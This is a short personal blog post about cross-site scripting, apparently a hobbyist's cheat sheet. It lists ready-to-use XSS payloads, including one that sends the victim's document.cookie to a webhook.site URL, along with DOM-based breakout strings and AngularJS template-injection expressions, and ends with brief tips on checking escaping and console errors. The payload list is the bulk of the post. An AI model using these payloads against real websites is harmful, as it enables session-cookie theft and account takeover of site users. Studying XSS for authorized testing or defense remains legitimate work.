---
layout: post
title:  "XSS Master Race"
date:   2023-10-24 08:35:09 +0200
categories: jekyll update
permalink: /xss/
image: /assets/uploads/xss.png
---

# PostXSS

Hi everyone it's Denverledinosor and welcome to this new post about XSS

**Here is a couple of Payload :**
```markdown
Classic
{% raw %}
javascript:alert(document.cookie)
cookie='.concat(document.cookie);//
';document.location.href='https://webhook.site/03d5790c-ca53-47be-bd66-3ceca1d48f1f/?cookie='.concat(document.cookie);//
{% endraw %}
DOM XSS
{% raw %}
' % <alert(1)>; //
' - <alert(1)>; //
' + <alert(1)>; //
' / <alert(1)>; //
' ^ <alert(1); //
';alert(1);'
{% endraw %}
DOM XSS Angular
{% raw %}
{{1+1}}
{{$eval.constructor('alert(1)')()}}
{{$eval(5,5)}}
{% endraw %}
```

**Petits conseils pour les XSS Basées sur le DOM**

**Regardez le rendu de votre entrée sur le code source.**

On this type of vuln, we have the possibility of being able to visualize our actions and the repercussions they have. For example, checking that quotes have been escaped.

**Look at the errors that the console displays to you
your browser.**

Errors
allow you to understand many things about the code, and often in this genre
of XSS errors, that’s a good sign! This means that we managed to do
carry out things on the site that were not initially planned. Look
errors are therefore essential.
>https://0xhorizon.eu/fr/articles/xss-dom-based/